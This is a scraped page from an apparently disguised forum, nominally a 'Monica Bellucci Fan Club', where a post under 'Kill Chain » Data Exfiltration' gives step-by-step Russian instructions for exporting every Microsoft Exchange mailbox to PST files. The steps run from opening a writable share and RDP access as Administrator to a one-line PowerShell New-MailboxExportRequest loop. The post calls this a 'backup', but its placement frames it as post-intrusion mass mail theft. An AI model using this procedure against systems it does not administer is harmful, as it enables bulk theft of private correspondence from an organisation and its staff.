@@ -1,0 +1,58 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Data Exfiltration »
+    Бэкап всех ящиков MS Exchange в одну команду
+
+Бэкап всех ящиков MS Exchange в одну команду
+user5 · 1 · 13
+« предыдущая тема следующая тема »
+
+Страницы: 1
+user5
+
+    Users
+    Member
+    *
+        1
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+: Мая 20, 2021, 03:31:56 am
+Записан
+
+1)  Ищем сервер где есть свободное место >500gb (в зависимости от кол-ва ящиков в сети)
+2) Создаем там новую папку для .pst файлов
+3)  Расшариваем ее для пользователя Exchange Trusted Subsystem
+4)  Делаем ему права Read/Write
+5) Идем по рдп за екзч сервер и запускаем от Администратора Exchange management shell
+6) Далее та самая команда: foreach ($mbx in (Get-Mailbox)){New-MailboxExportRequest -mailbox $mbx.alias -FilePath "\\Server\SharedFolder\$($mbx.Alias).pst"}
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Data Exfiltration »
+    Бэкап всех ящиков MS Exchange в одну команду
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
